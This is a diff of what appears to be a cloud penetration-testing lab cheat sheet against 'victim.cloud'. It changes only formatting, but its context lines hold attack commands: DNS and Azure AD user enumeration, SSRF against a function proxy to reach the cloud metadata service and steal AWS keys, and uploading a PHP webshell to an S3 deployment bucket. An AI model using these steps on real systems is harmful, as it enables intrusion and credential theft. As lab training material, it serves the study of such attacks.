@@ -1,6 +1,6 @@
 cloud command 
 
-Enumeration 1
+Enumeration ================================== 1
 
 DNS Records
 
@@ -9,16 +9,13 @@ dig -t MX victim.cloud +short
 dig @8.8.8.8 victim.cloud ANY +noall +answer
 for any in {TXT,MX,NS,A,SOA}; do dig @8.8.8.8 victim.cloud $any +nocmd +noall +answer; done
 
-
 SubDomain Enumeration
 
 python3 dnscan.py -R 1.1.1.1 -d victim.cloud -w subdomains.txt
 
 
 
-
-
-Enumeration 2
+Enumeration ================================== 2
 
 ●SSL certificates
 ●Certificate Transparency
@@ -36,8 +33,7 @@ for i in $(cat targets.txt); do for a in $(dig -t A $i +short | grep -E "[0-9\.]
 
 
 
-
-Enumeration 3
+Enumeration ================================== 3
 
 curl -s "https://login.microsoftonline.com/getuserrealm.srf?login=test@victim.cloud&xml=1" | grep -E --colour '<NameSpaceType>[^<]+</NameSpaceType>'
 curl -s -X POST https://login.microsoftonline.com/common/GetCredentialType -d ""{\"Username\":\"test@victim.cloud\"}"" | jq -e '.IfExistsResult'
@@ -47,10 +43,9 @@ enum_azuread_users victim.cloud popular_names_list.txt
 
 
 
-
 Gaining Entry Via Exposed Services
 
-Entry 1
+Entry ================================== 1
 
 ●Obtain AWS API access token keys by exploiting a SSRF/Directory Traversal vulnerability on
 a serverless function hosted at
@@ -74,7 +69,7 @@ curl -i http://azurefunction.victim.cloud/api/victimproxy?page=http://169.254.16
 
 
 
-Entry 2
+Entry ================================== 2
 
 ●Identify and exploit SSRF vulnerability to gain access to S3 buckets and download the
 source of the application hosted on AWS cloud. Further, Upload a webshell via Continuous
@@ -129,8 +124,6 @@ aws s3 cp index.zip s3://elasticbeanstalk-us-east-2-266909425344/cih-ebs-userX/
 To view the webshell 
 
 userX.victim.cloud/<userID>.php
-
-
 
 
 
